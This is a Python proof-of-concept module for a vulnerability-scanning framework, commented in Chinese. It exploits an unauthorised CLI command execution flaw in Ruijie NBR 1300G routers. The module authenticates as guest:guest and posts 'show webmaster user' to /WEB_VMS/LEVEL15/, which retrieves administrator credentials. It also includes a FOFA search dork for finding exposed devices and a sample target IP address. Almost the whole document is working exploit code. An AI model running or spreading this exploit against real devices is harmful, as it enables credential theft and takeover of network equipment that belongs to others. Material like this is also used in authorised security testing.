# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "2",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            v1:略  
            v2:上一个版本的逻辑在面对一些特殊设备时会存在误报现象，故此此版本将匹配范围扩大，以降低误报
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "锐捷NBR 1300G 路由器 越权CLI命令执行漏洞",                        # 漏洞名称
        "VulnID" : "Blen-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "锐捷NBRNBR1300G 路由器",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="锐捷网络 --NBR路由器--登录界面"
        """,                     # fofa搜索语句
        "example" : "https://60.8.106.30:4430",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/WEB_VMS/LEVEL15/" # url自己按需调整
        data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "webmaster" in req.text and\
                 "password" in req.text and\
                      req.status_code == 200 and\
                           "<TITLE>/WEB_VMS/LEVEL15/</TITLE></HEAD>" in req.text and\
                               "Command was: show webmaster user" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()